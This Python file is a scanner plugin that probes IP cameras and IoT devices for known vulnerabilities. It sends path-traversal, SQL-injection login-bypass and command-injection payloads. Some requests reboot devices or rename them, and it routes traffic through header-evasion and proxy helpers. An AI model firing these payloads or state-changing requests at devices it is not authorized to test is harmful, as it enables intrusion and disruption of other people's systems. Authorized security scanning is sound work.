"""
Vulnerability Scanner Plugin for Gridland
Detects known CVEs and security vulnerabilities in IP cameras and IoT devices
"""
import requests
import re
from typing import List, Dict, Any
from lib.plugins import ScannerPlugin, Finding
from lib.core import ScanTarget
from lib.evasion import get_request_headers, get_proxies
import os
import json
import time
from datetime import datetime, timedelta

CISA_KEV_URL = "https://www.cisa.gov/known-exploited-vulnerabilities-catalog/known-exploited-vulnerabilities.json"
CVE_CACHE_FILE = "cve_cache.json"
CACHE_DURATION_HOURS = 24


def update_cve_database() -> Dict:
    """
    Fetches the CISA Known Exploited Vulnerabilities (KEV) catalog and caches it.
    Updates the cache only if it's older than CACHE_DURATION_HOURS.
    """
    cache_exists = os.path.exists(CVE_CACHE_FILE)
    if cache_exists:
        last_modified_time = datetime.fromtimestamp(os.path.getmtime(CVE_CACHE_FILE))
        if datetime.now() - last_modified_time < timedelta(hours=CACHE_DURATION_HOURS):
            with open(CVE_CACHE_FILE, 'r') as f:
                return json.load(f)

    try:
        response = requests.get(CISA_KEV_URL, timeout=15)
        response.raise_for_status()
        data = response.json()
        with open(CVE_CACHE_FILE, 'w') as f:
            json.dump(data, f)
        return data
    except (requests.RequestException, json.JSONDecodeError) as e:
        print(f"Error updating CVE database: {e}")
        if cache_exists:
            with open(CVE_CACHE_FILE, 'r') as f:
                return json.load(f)
        return {}


class VulnerabilityScannerPlugin(ScannerPlugin):
    """
    Comprehensive vulnerability detection for IP cameras and IoT devices.
    Tests for known CVEs, authentication bypasses, and common exploits.
    """
    
    def can_scan(self, target: ScanTarget) -> bool:
        """Check if target has web ports for vulnerability testing"""
        vuln_ports = [80, 443, 8080, 8443, 8000, 8001, 8008, 8081, 8082, 8083, 8084, 8085]
        return any(p.port in vuln_ports for p in target.open_ports)

    # Known vulnerability signatures and exploit paths, now with vendor context
    VULNERABILITY_TESTS = {
        "directory_traversal": {
            "paths": [
                {"path": "/cgi-bin/hi3510/param.cgi?cmd=getserverinfo&-usr=admin&-pwd=admin&-file=../../../../etc/passwd"},
                {"path": "/ISAPI/Security/sessionLogin/capabilities?username=admin'%20or%20'1'='1&password=admin", "vendor": "hikvision"},
                {"path": "/cgi-bin/nobody/VerifyCode.cgi?account=admin'or'1=1'%23"},
                {"path": "/../../../../../../../etc/passwd"},
                {"path": "/cgi-bin/supervisor.cgi?action=logincheck&user=admin&password=../../../../etc/passwd%00"},
                {"path": "/axis-cgi/jpg/image.cgi?resolution=640x480&dummy=../../../../../../../etc/passwd", "vendor": "axis"}
            ],
            "indicators": ["root:", "daemon:", "nobody:", "www-data:", "passwd"],
            "severity": "critical",
            "description": "Directory traversal vulnerability allows reading system files"
        },
        "auth_bypass": {
            "paths": [
                {"path": "/cgi-bin/nobody/Machine.cgi?action=list"},
                {"path": "/ISAPI/Security/userCheck", "vendor": "hikvision"},
                {"path": "/cgi-bin/hi3510/checkuser.cgi?&-name=admin&-passwd="},
                {"path": "/axis-cgi/admin/param.cgi?action=list&group=Network", "vendor": "axis"},
                {"path": "/admin/admin_testip.php"},
                {"path": "/cgi-bin/operator/admin.cgi"},
                {"path": "/sony/admin", "vendor": "sony"},
                {"path": "/panasonic/admin", "vendor": "panasonic"}
            ],
            "indicators": ["<admin>", "authentication", "login successful", "admin panel", "configuration"],
            "severity": "high",
            "description": "Authentication bypass allows unauthorized access"
        },
        "command_injection": {
            "paths": [
                {"path": "/cgi-bin/hi3510/test.cgi?cmd=cat%20/etc/passwd"},
                {"path": "/cgi-bin/nobody/Machine.cgi?action=shellcommand&command=id"},
                {"path": "/ISAPI/System/deviceInfo?devInfo=%22%3e%3cscript%3ealert(%27xss%27)%3c/script%3e", "vendor": "hikvision"},
                {"path": "/axis-cgi/admin/param.cgi?action=update&root.Network.Interface.I0.IPv4.Address=`id`", "vendor": "axis"},
                {"path": "/cgi-bin/supervisor.cgi?action=&command=id;"}
            ],
            "indicators": ["uid=", "gid=", "groups=", "root", "daemon"],
            "severity": "critical",
            "description": "Command injection vulnerability allows remote code execution"
        },
        "info_disclosure": {
            "paths": [
                {"path": "/cgi-bin/hi3510/param.cgi?cmd=getserverinfo"},
                {"path": "/ISAPI/System/deviceInfo", "vendor": "hikvision"},
                {"path": "/axis-cgi/admin/param.cgi?action=list", "vendor": "axis"},
                {"path": "/cgi-bin/nobody/Machine.cgi?action=list"},
                {"path": "/sony/common/appInfo.cgi", "vendor": "sony"},
                {"path": "/panasonic/config/config_backup.bin", "vendor": "panasonic"},
                {"path": "/admin/system_log.cgi"},
                {"path": "/cgi-bin/supervisor.cgi?action=get&category=system.*"}
            ],
            "indicators": ["version", "model", "serial", "firmware", "password", "key"],
            "severity": "medium",
            "description": "Information disclosure reveals sensitive system details"
        },
        "csrf": {
            "paths": [
                {"path": "/admin/admin_testip.php?ip=127.0.0.1"},
                {"path": "/cgi-bin/nobody/Machine.cgi?action=reboot"},
                {"path": "/ISAPI/System/reboot", "vendor": "hikvision"},
                {"path": "/axis-cgi/admin/param.cgi?action=update&root.System.Name=HACKED", "vendor": "axis"}
            ],
            "indicators": ["success", "rebooting", "updated", "changed"],
            "severity": "medium",
            "description": "CSRF vulnerability allows unauthorized actions"
        }
    }

    def _test_specific_cve(self, base_url: str, cve_id: str, proxy_url: str = None) -> bool:
        """
        Tests for a specific CVE based on its ID. Acts as a dispatcher.
        Returns True if the vulnerability is confirmed, False otherwise.
        """
        test_functions = {
            "CVE-2017-7921": self._test_cve_2017_7921,
            "CVE-2013-6117": self._test_cve_2013_6117,
        }
        test_function = test_functions.get(cve_id)
        if test_function:
            return test_function(base_url, proxy_url)
        return False

    def _test_cve_2017_7921(self, base_url: str, proxy_url: str = None) -> bool:
        """Tests for Hikvision unauthenticated access (CVE-2017-7921)."""
        url = f"{base_url}/ISAPI/Security/userCheck"
        try:
            response = requests.get(
                url,
                timeout=5,
                verify=False,
                allow_redirects=True,
                headers=get_request_headers(),
                proxies=get_proxies(proxy_url)
            )
            return response.status_code == 200
        except requests.RequestException:
            return False

    def _test_cve_2013_6117(self, base_url: str, proxy_url: str = None) -> bool:
        """Tests for Dahua config download (CVE-2013-6117)."""
        url = f"{base_url}/current_config/passwd"
        try:
            response = requests.get(
                url,
                timeout=5,
                verify=False,
                allow_redirects=True,
                headers=get_request_headers(),
                proxies=get_proxies(proxy_url)
            )
            return response.status_code == 200
        except requests.RequestException:
            return False

    def scan(self, target: ScanTarget, fingerprint: dict = None) -> List[Finding]:
        """Perform intelligence-led vulnerability scanning."""
        findings = []
        proxy_url = os.environ.get('PROXY_URL')

        vendor = fingerprint.get('vendor') if fingerprint else None
        cve_data = update_cve_database()

        for port_result in target.open_ports:
            if port_result.port not in [80, 443, 8080, 8443, 8000, 8001, 8008, 8081, 8082, 8083, 8084, 8085]:
                continue

            protocol = "https" if port_result.port in [443, 8443] else "http"
            base_url = f"{protocol}://{target.ip}:{port_result.port}"

            # 1. Run generic and vendor-specific tests from the main test bank
            for vuln_type, vuln_data in self.VULNERABILITY_TESTS.items():
                findings.extend(self._test_vulnerability(base_url, vuln_type, vuln_data, proxy_url, vendor=vendor))

            # 2. Run targeted CVE checks based on fingerprint and CISA KEV database
            if vendor and cve_data and 'vulnerabilities' in cve_data:
                vendor_lower = vendor.lower()

                for vuln in cve_data['vulnerabilities']:
                    cve_vendor = vuln.get('vendor', '').lower()

                    # Only test vulnerabilities relevant to the identified vendor
                    if cve_vendor == vendor_lower:
                        cve_id = vuln.get('cveID')
                        if self._test_specific_cve(base_url, cve_id, proxy_url):
                            finding = Finding(
                                category="vulnerability",
                                description=f"Confirmed CISA KEV match for {vendor}: {cve_id}",
                                severity="critical",
                                port=port_result.port,
                                url=base_url,
                                data={"cveID": cve_id, "vendor": vendor}
                            )
                            findings.append(finding)
        
        return findings

    def _test_vulnerability(self, base_url: str, vuln_type: str, vuln_data: Dict[str, Any], proxy_url: str = None, vendor: str = None) -> List[Finding]:
        """Test a specific vulnerability type, respecting vendor context."""
        findings = []
        
        for path_info in vuln_data["paths"]:
            path = path_info.get("path")
            required_vendor = path_info.get("vendor")

            # If a vendor is required for this path, and it doesn't match the target's vendor, skip it.
            if required_vendor and required_vendor.lower() != (vendor or '').lower():
                continue

            try:
                url = f"{base_url}{path}"
                response = requests.get(
                    url,
                    timeout=5,
                    verify=False,
                    allow_redirects=True,
                    headers=get_request_headers(),
                    proxies=get_proxies(proxy_url)
                )
                
                if response.status_code == 200:
                    content = response.text.lower()
                    
                    # Check for vulnerability indicators
                    for indicator in vuln_data["indicators"]:
                        if indicator.lower() in content:
                            finding = Finding(
                                category="vulnerability",
                                description=f"{vuln_data['description']} - {vuln_type}",
                                severity=vuln_data["severity"],
                                url=url,
                                data={
                                    "vulnerability_type": vuln_type,
                                    "indicator_found": indicator,
                                    "response_snippet": content[:200]
                                }
                            )
                            findings.append(finding)
                            break  # Only report once per path
                            
            except requests.RequestException:
                continue
                
        return findings

    def get_description(self) -> str:
        """Get plugin description"""
        return "Comprehensive vulnerability scanner for IP cameras and IoT devices"